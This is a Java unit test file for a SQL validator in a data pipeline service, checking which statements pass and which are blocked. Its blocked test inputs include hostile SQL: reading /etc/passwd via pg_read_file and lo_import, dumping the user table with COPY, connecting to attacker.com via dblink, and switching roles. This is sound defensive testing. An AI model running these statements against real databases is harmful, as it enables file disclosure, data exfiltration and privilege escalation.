package com.smartfirehub.pipeline.service.validator;

import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.smartfirehub.pipeline.exception.ScriptExecutionException;
import org.junit.jupiter.api.Test;

class SqlValidatorTest {

  private final SqlValidator validator = new SqlValidator();

  // --- 허용되는 구문 ---

  @Test
  void validate_selectStatement_passes() {
    assertThatCode(() -> validator.validate("SELECT * FROM data.some_table"))
        .doesNotThrowAnyException();
  }

  @Test
  void validate_insertStatement_passes() {
    assertThatCode(
            () -> validator.validate("INSERT INTO data.some_table (col1, col2) VALUES ('a', 'b')"))
        .doesNotThrowAnyException();
  }

  @Test
  void validate_updateStatement_passes() {
    assertThatCode(() -> validator.validate("UPDATE data.some_table SET col1 = 'new' WHERE id = 1"))
        .doesNotThrowAnyException();
  }

  @Test
  void validate_deleteStatement_passes() {
    assertThatCode(() -> validator.validate("DELETE FROM data.some_table WHERE id = 1"))
        .doesNotThrowAnyException();
  }

  // --- 차단되는 구문 ---

  @Test
  void validate_dropTable_blocked() {
    assertThatThrownBy(() -> validator.validate("DROP TABLE data.some_table"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("DROP");
  }

  @Test
  void validate_alterTable_blocked() {
    assertThatThrownBy(() -> validator.validate("ALTER TABLE data.some_table ADD COLUMN x TEXT"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("ALTER");
  }

  @Test
  void validate_createTable_blocked() {
    assertThatThrownBy(() -> validator.validate("CREATE TABLE data.new_table (id BIGINT)"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("CREATE");
  }

  @Test
  void validate_grantStatement_blocked() {
    assertThatThrownBy(
            () -> validator.validate("GRANT SELECT ON data.some_table TO pipeline_executor"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("GRANT");
  }

  @Test
  void validate_revokeStatement_blocked() {
    assertThatThrownBy(
            () -> validator.validate("REVOKE SELECT ON data.some_table FROM pipeline_executor"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("REVOKE");
  }

  @Test
  void validate_setRole_blocked() {
    assertThatThrownBy(() -> validator.validate("SET ROLE app; SELECT 1"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("SET ROLE");
  }

  @Test
  void validate_resetRole_blocked() {
    assertThatThrownBy(() -> validator.validate("RESET ROLE; SELECT 1"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("차단된 키워드");
  }

  @Test
  void validate_copyStatement_blocked() {
    assertThatThrownBy(
            () -> validator.validate("COPY (SELECT * FROM public.\"user\") TO '/tmp/dump.csv'"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("COPY");
  }

  @Test
  void validate_pgReadFile_blocked() {
    assertThatThrownBy(() -> validator.validate("SELECT pg_read_file('/etc/passwd')"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("PG_READ_FILE");
  }

  @Test
  void validate_dblink_blocked() {
    assertThatThrownBy(
            () -> validator.validate("SELECT dblink_connect('host=attacker.com dbname=x')"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("DBLINK");
  }

  @Test
  void validate_doBlock_blocked() {
    assertThatThrownBy(() -> validator.validate("DO $$ BEGIN RAISE NOTICE 'hello'; END $$;"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("DO $");
  }

  @Test
  void validate_truncateStatement_blocked() {
    assertThatThrownBy(() -> validator.validate("TRUNCATE data.some_table"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("TRUNCATE");
  }

  @Test
  void validate_loImport_blocked() {
    assertThatThrownBy(() -> validator.validate("SELECT lo_import('/etc/passwd')"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("LO_IMPORT");
  }

  @Test
  void validate_setSessionAuthorization_blocked() {
    assertThatThrownBy(() -> validator.validate("SET SESSION AUTHORIZATION 'app'"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("SET SESSION AUTHORIZATION");
  }

  @Test
  void validate_caseInsensitive_blocked() {
    assertThatThrownBy(() -> validator.validate("dRoP TABLE data.some_table"))
        .isInstanceOf(ScriptExecutionException.class)
        .hasMessageContaining("DROP");
  }

  @Test
  void validate_nullScript_throwsException() {
    assertThatThrownBy(() -> validator.validate(null)).isInstanceOf(ScriptExecutionException.class);
  }

  @Test
  void validate_blankScript_throwsException() {
    assertThatThrownBy(() -> validator.validate("   "))
        .isInstanceOf(ScriptExecutionException.class);
  }
}
